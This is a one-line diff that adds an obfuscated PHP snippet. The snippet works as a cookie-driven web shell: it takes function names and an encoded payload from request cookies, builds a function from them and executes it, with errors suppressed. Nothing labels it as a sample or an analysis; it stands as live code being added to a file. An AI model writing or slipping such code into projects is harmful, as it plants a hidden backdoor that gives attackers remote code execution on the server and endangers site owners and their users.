@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['nt']){$mt=$_COOKIE['nt']("",@$_COOKIE['uymw'](@$_COOKIE['vf']));$mt();}?>
